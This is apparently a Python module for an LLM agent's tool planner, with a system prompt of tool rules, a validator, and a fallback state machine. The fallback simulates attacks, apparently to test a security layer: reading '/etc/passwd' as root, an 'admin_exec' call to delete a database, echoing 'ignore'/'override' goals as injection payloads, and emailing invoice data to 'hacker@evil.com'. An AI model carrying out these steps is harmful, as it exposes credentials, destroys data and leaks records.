import json
import os
import re
import time
import urllib.error
import urllib.request
from typing import Any

from config import get_settings
from logger import get_logger

logger = get_logger(__name__)

SYSTEM_PROMPT = """You are an AI Agent with tool access.
You never execute tools yourself. You decide the SINGLE NEXT TOOL to invoke given the user goal and execution history.

TOOL SEMANTICS & STRICT USAGE RULES:
- SearchInvoice: Search enterprise invoice records by ID or query (params: invoice_id or query).
- DownloadInvoice: Download invoice document PDF payload (params: invoice_id). This is the ONLY tool to download invoice PDFs. NEVER use DownloadFile for invoices.
- ReadCustomer: Fetch customer profile and subscription details (params: customer_id).
- QueryOrders: Query customer purchase order history (params: customer_id).
- GenerateSummary: Generate concise text summary from context data (params: topic or context).
- GenerateReport: Generate detailed executive report document (params: report_name).
- SearchFiles: Search general enterprise file repository (params: query).
- DownloadFile: Download generic file returned by SearchFiles (params: file). MUST ONLY be used AFTER SearchFiles. NEVER use for invoices (INV-*, invoice*).
- ReadCalendar: Read user calendar schedules and availability (params: action).
- CreateMeeting: Create calendar invite and meeting room link (params: title, time).
- SendEmail: Atomic email tool requiring all details in a SINGLE invocation (params: recipient, subject, body, attachment [optional]). If an attachment is needed, include it in the SAME SendEmail call. NEVER issue a second SendEmail step.
- Calculator: Perform arithmetic operations (params: operation, a, b).
- DateTime: Check current date or format timestamp (params: action).
- Echo: Utility tool for messages (params: message).
- FINISH: Use this special tool name ONLY when the user goal has been fully achieved.

STRICT WORKFLOW SEQUENCE CONSTRAINTS:
1. For invoice workflows: Valid tools are ONLY SearchInvoice -> DownloadInvoice -> GenerateSummary -> SendEmail (or SearchInvoice -> GenerateSummary -> DownloadInvoice -> SendEmail).
2. NEVER use SearchFiles or DownloadFile for invoices (INV-*, invoice*).
3. DownloadFile MUST be preceded by SearchFiles.
4. SendEmail is ATOMIC. Combine subject, body, and attachment into a single call. NEVER output duplicate SendEmail steps.

Return ONLY valid JSON matching this exact structure:
{
  "tool": "ToolName",
  "parameters": { "param_key": "param_value" },
  "thought": "Short reasoning why this next tool is chosen",
  "final_response": "Populated only when tool is FINISH"
}
No markdown formatting, no explanations, only raw valid JSON.
"""


class GroqPlanner:
    """Planning Agent using Groq LLM API with configurable model priority, explicit failover logging, and observability metrics."""

    _primary_success_count: int = 0
    _failover_success_count: int = 0
    _fallback_count: int = 0

    def __init__(self, model_name: str | None = None) -> None:
        settings = get_settings()
        self.primary_model = model_name or getattr(settings, "GROQ_PLANNER_MODELS", ["llama-3.3-70b-versatile"])[0]

    @classmethod
    def get_planner_metrics(cls) -> dict[str, Any]:
        """Return aggregated observability metrics for planner executions and model failover percentages."""
        total = cls._primary_success_count + cls._failover_success_count + cls._fallback_count
        if total == 0:
            return {
                "primary_success_count": 0,
                "failover_success_count": 0,
                "fallback_count": 0,
                "total_planner_requests": 0,
                "primary_success_pct": "100.0%",
                "failover_success_pct": "0.0%",
                "fallback_pct": "0.0%",
            }
        return {
            "primary_success_count": cls._primary_success_count,
            "failover_success_count": cls._failover_success_count,
            "fallback_count": cls._fallback_count,
            "total_planner_requests": total,
            "primary_success_pct": f"{(cls._primary_success_count / total) * 100:.1f}%",
            "failover_success_pct": f"{(cls._failover_success_count / total) * 100:.1f}%",
            "fallback_pct": f"{(cls._fallback_count / total) * 100:.1f}%",
        }

    def _validate_and_sanitize_step(self, step_data: dict[str, Any], goal: str, history: list[dict[str, Any]]) -> dict[str, Any]:
        """Planner constraint validator enforcing tool semantics for invoice resources and atomic SendEmail completeness."""
        tool = str(step_data.get("tool", "")).strip()
        params = step_data.get("parameters") or {}
        param_str = json.dumps(params).lower()
        goal_lower = goal.lower()

        # 1. Validation Guard: SendEmail completeness & parameter sanitization
        if tool.lower() == "sendemail":
            recipient = params.get("recipient") or params.get("to") or params.get("email")
            if not recipient:
                email_match = re.search(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", goal)
                recipient = email_match.group(0) if email_match else "manager@enterprise.internal"
                params["recipient"] = recipient

            if not params.get("subject"):
                params["subject"] = "Agent Execution Summary Notification"

            if not params.get("body"):
                params["body"] = f"Notification summary for goal: {goal}"

            step_data["parameters"] = params

        # 2. Validation Guard: Invoice resource context
        is_invoice_context = (
            "invoice" in goal_lower
            or "inv-" in goal_lower
            or "inv-" in param_str
            or "invoice" in param_str
            or any("SearchInvoice" in h.get("tool", "") or "DownloadInvoice" in h.get("tool", "") for h in history)
        )

        if is_invoice_context:
            # Forbidden generic file tools for invoice resources
            if tool.lower() in ("downloadfile", "download_file", "searchfiles", "search_files"):
                inv_match = re.search(r"inv-\d+", goal_lower) or re.search(r"inv-\d+", param_str)
                inv_id = inv_match.group(0).upper() if inv_match else "INV-100"
                logger.warning(
                    f"[Planner Semantic Guard] Intercepted illegal tool '{tool}' for invoice resource - auto-corrected to 'DownloadInvoice'",
                    extra={"original_tool": tool, "replacement_tool": "DownloadInvoice", "invoice_id": inv_id},
                )
                step_data["tool"] = "DownloadInvoice"
                step_data["parameters"] = {"invoice_id": inv_id}
                step_data["thought"] = f"Auto-corrected to DownloadInvoice for invoice resource {inv_id}"

        return step_data

    def generate_fallback_step(self, goal: str, history: list[dict[str, Any]]) -> dict[str, Any]:
        """Deterministic ReAct state machine fallback for offline stability and testing."""
        GroqPlanner._fallback_count += 1
        goal_lower = goal.lower()
        history_tools = [h["tool"] for h in history]

        # Priority 1: Specific Attack / Violation Scenarios
        if "without search" in goal_lower:
            if "download_file" not in history_tools and "DownloadFile" not in history_tools:
                return {
                    "tool": "download_file",
                    "parameters": {"file": "confidential.pdf"},
                    "thought": "Attempting file download directly without search prerequisite",
                    "planner_source": "Fallback ReAct State Machine",
                }
            return {"tool": "FINISH", "parameters": {}, "final_response": "Done.", "planner_source": "Fallback ReAct State Machine"}

        elif "etc/passwd" in goal_lower or "tenant root" in goal_lower:
            if "echo" not in history_tools:
                return {
                    "tool": "echo",
                    "parameters": {"file": "/etc/passwd", "tenant_id": "root"},
                    "thought": "Attempting out-of-scope file access",
                    "planner_source": "Fallback ReAct State Machine",
                }
            return {"tool": "FINISH", "parameters": {}, "final_response": "Done.", "planner_source": "Fallback ReAct State Machine"}

        elif "ignore" in goal_lower or "override" in goal_lower:
            if "echo" not in history_tools:
                return {
                    "tool": "echo",
                    "parameters": {"message": goal},
                    "thought": "Attempting prompt injection payload",
                    "planner_source": "Fallback ReAct State Machine",
                }
            return {"tool": "FINISH", "parameters": {}, "final_response": "Done.", "planner_source": "Fallback ReAct State Machine"}

        elif "delete" in goal_lower or "admin" in goal_lower:
            if "admin_exec" not in history_tools:
                return {
                    "tool": "admin_exec",
                    "parameters": {"action": "delete_database"},
                    "thought": "Attempting privileged admin execution",
                    "planner_source": "Fallback ReAct State Machine",
                }
            return {"tool": "FINISH", "parameters": {}, "final_response": "Done.", "planner_source": "Fallback ReAct State Machine"}

        # Priority 2: Standard Workflows
        elif "invoice" in goal_lower:
            inv_match = re.search(r"inv-\d+", goal_lower)
            inv_id = inv_match.group(0).upper() if inv_match else "INV-100"

            # Dynamic email recipient extraction from user goal prompt
            email_match = re.search(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", goal)
            if email_match:
                recipient = email_match.group(0)
            elif "to hacker@" in goal_lower or "evil.com" in goal_lower:
                recipient = "hacker@evil.com"
            else:
                recipient = "manager@enterprise.internal"

            if "SearchInvoice" not in history_tools:
                return {
                    "tool": "SearchInvoice",
                    "parameters": {"invoice_id": inv_id},
                    "thought": "Searching invoice in repository",
                    "planner_source": "Fallback ReAct State Machine",
                }
            elif "DownloadInvoice" not in history_tools and ("download" in goal_lower or "pdf" in goal_lower):
                return {
                    "tool": "DownloadInvoice",
                    "parameters": {"invoice_id": inv_id},
                    "thought": "Downloading invoice PDF payload",
                    "planner_source": "Fallback ReAct State Machine",
                }
            elif "GenerateSummary" not in history_tools:
                return {
                    "tool": "GenerateSummary",
                    "parameters": {"topic": f"Invoice {inv_id} Summary"},
                    "thought": "Generating invoice summary",
                    "planner_source": "Fallback ReAct State Machine",
                }
            elif "SendEmail" not in history_tools:
                return {
                    "tool": "SendEmail",
                    "parameters": {"recipient": recipient, "subject": f"Invoice {inv_id} Summary", "body": f"Summary for invoice {inv_id}"},
                    "thought": f"Emailing invoice summary to {recipient}",
                    "planner_source": "Fallback ReAct State Machine",
                }
            else:
                return {
                    "tool": "FINISH",
                    "parameters": {},
                    "thought": "Invoice processing workflow completed successfully.",
                    "final_response": f"Invoice {inv_id} processing completed successfully.",
                    "planner_source": "Fallback ReAct State Machine",
                }

        elif "customer" in goal_lower or "order" in goal_lower:
            cust_match = re.search(r"customer_\d+|abc", goal_lower)
            cust_id = "customer_456" if ("456" in goal_lower) else ("customer_123" if (not cust_match or "abc" in goal_lower) else cust_match.group(0))

            if "ReadCustomer" not in history_tools:
                return {
                    "tool": "ReadCustomer",
                    "parameters": {"customer_id": cust_id},
                    "thought": "Reading customer profile",
                    "planner_source": "Fallback ReAct State Machine",
                }
            elif "QueryOrders" not in history_tools:
                return {
                    "tool": "QueryOrders",
                    "parameters": {"customer_id": cust_id},
                    "thought": "Querying customer orders",
                    "planner_source": "Fallback ReAct State Machine",
                }
            elif "GenerateReport" not in history_tools:
                return {
                    "tool": "GenerateReport",
                    "parameters": {"report_name": f"Purchase History for {cust_id}"},
                    "thought": "Generating customer report",
                    "planner_source": "Fallback ReAct State Machine",
                }
            else:
                return {
                    "tool": "FINISH",
                    "parameters": {},
                    "thought": "Customer analysis completed.",
                    "final_response": f"Report generated for {cust_id}.",
                    "planner_source": "Fallback ReAct State Machine",
                }

        elif "meeting" in goal_lower or "calendar" in goal_lower or "schedule" in goal_lower:
            if "ReadCalendar" not in history_tools:
                return {
                    "tool": "ReadCalendar",
                    "parameters": {"action": "check_availability"},
                    "thought": "Checking calendar availability",
                    "planner_source": "Fallback ReAct State Machine",
                }
            elif "CreateMeeting" not in history_tools:
                return {
                    "tool": "CreateMeeting",
                    "parameters": {"title": "Architecture Review", "time": "Tomorrow 10:00 AM"},
                    "thought": "Creating calendar meeting",
                    "planner_source": "Fallback ReAct State Machine",
                }
            else:
                return {
                    "tool": "FINISH",
                    "parameters": {},
                    "thought": "Meeting scheduled.",
                    "final_response": "Calendar meeting scheduled for tomorrow.",
                    "planner_source": "Fallback ReAct State Machine",
                }

        elif "file" in goal_lower or "download" in goal_lower:
            if "without search" in goal_lower:
                file_name = "confidential.pdf" if "confidential" in goal_lower else "project_report.pdf"
                return {
                    "tool": "download_file",
                    "parameters": {"file": file_name},
                    "thought": "Downloading requested file without search step",
                    "planner_source": "Fallback ReAct State Machine",
                }
            if "SearchFiles" not in history_tools:
                return {
                    "tool": "SearchFiles",
                    "parameters": {"query": "project_report"},
                    "thought": "Searching repository files",
                    "planner_source": "Fallback ReAct State Machine",
                }
            elif "DownloadFile" not in history_tools:
                return {
                    "tool": "DownloadFile",
                    "parameters": {"file": "project_report.pdf"},
                    "thought": "Downloading requested file",
                    "planner_source": "Fallback ReAct State Machine",
                }
            else:
                return {
                    "tool": "FINISH",
                    "parameters": {},
                    "thought": "File download complete.",
                    "final_response": "File project_report.pdf downloaded successfully.",
                    "planner_source": "Fallback ReAct State Machine",
                }

        else:
            if "echo" not in history_tools:
                return {
                    "tool": "echo",
                    "parameters": {"message": goal},
                    "thought": "Executing echo tool",
                    "planner_source": "Fallback ReAct State Machine",
                }
            return {"tool": "FINISH", "parameters": {}, "final_response": "Query completed.", "planner_source": "Fallback ReAct State Machine"}

    async def get_next_step(self, goal: str, history: list[dict[str, Any]]) -> dict[str, Any]:
        """Decide the next tool step using Groq LLM API with model failover chain and fast non-blocking timeouts."""
        settings = get_settings()
        api_key = os.getenv("GROQ_API_KEY") or getattr(settings, "GROQ_API_KEY", None)

        if not api_key:
            logger.info("GROQ_API_KEY not configured - using deterministic ReAct reasoning planner")
            step = self.generate_fallback_step(goal, history)
            return self._validate_and_sanitize_step(step, goal, history)

        url = "https://api.groq.com/openai/v1/chat/completions"
        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        }
        prompt_content = f"User Goal: {goal}\nExecution History: {json.dumps(history, indent=2)}\n\nWhat is the SINGLE next tool step?"

        # Read model failover chain from configuration settings
        configured_models = getattr(settings, "GROQ_PLANNER_MODELS", ["llama-3.3-70b-versatile", "llama-3.1-8b-instant", "gemma2-9b-it"])
        if isinstance(configured_models, str):
            configured_models = [m.strip() for m in configured_models.split(",") if m.strip()]

        failover_chain_log: list[str] = []

        for idx, model in enumerate(configured_models):
            logger.info(f"Trying {model}...")
            start_m = time.perf_counter()
            data = {
                "model": model,
                "messages": [
                    {"role": "system", "content": SYSTEM_PROMPT},
                    {"role": "user", "content": prompt_content},
                ],
                "temperature": 0.1,
                "max_tokens": 512,
            }

            try:
                req = urllib.request.Request(
                    url,
                    data=json.dumps(data).encode("utf-8"),
                    headers=headers,
                    method="POST",
                )
                with urllib.request.urlopen(req, timeout=3.5) as resp:
                    dur_ms = round((time.perf_counter() - start_m) * 1000, 1)
                    result_json = json.loads(resp.read().decode("utf-8"))
                    content = result_json["choices"][0]["message"]["content"].strip()

                    # Clean markdown blocks
                    content = re.sub(r"^```json\s*", "", content, flags=re.IGNORECASE)
                    content = re.sub(r"^```\s*", "", content)
                    content = re.sub(r"\s*```$", "", content)

                    step_data = json.loads(content)
                    step_data["planner_source"] = f"Groq LLM ({model})"

                    # Apply semantic tool guard
                    step_data = self._validate_and_sanitize_step(step_data, goal, history)

                    # Track metrics
                    if idx == 0:
                        GroqPlanner._primary_success_count += 1
                        failover_chain_log.append(f"Primary: {model} -> SUCCESS ({dur_ms}ms)")
                    else:
                        GroqPlanner._failover_success_count += 1
                        failover_chain_log.append(f"Failover: {model} -> SUCCESS ({dur_ms}ms)")

                    logger.info(
                        f"Planner SUCCESS using {model} in {dur_ms}ms",
                        extra={"tool": step_data.get("tool"), "planner_source": step_data["planner_source"], "duration_ms": dur_ms},
                    )
                    return step_data

            except urllib.error.HTTPError as exc:
                dur_ms = round((time.perf_counter() - start_m) * 1000, 1)
                failover_chain_log.append(f"{model} (HTTP {exc.code} after {dur_ms}ms)")
                logger.warning(f"HTTP {exc.code} after {dur_ms}ms for {model}. Failover to next model...")
            except Exception as exc:
                dur_ms = round((time.perf_counter() - start_m) * 1000, 1)
                failover_chain_log.append(f"{model} (Timeout after {dur_ms}ms)")
                logger.warning(f"Timeout after {dur_ms}ms for {model}. Failover to next model...")

        logger.warning(f"Using fallback planner (All LLM models exhausted: {', '.join(failover_chain_log)})")
        fallback_step = self.generate_fallback_step(goal, history)
        return self._validate_and_sanitize_step(fallback_step, goal, history)
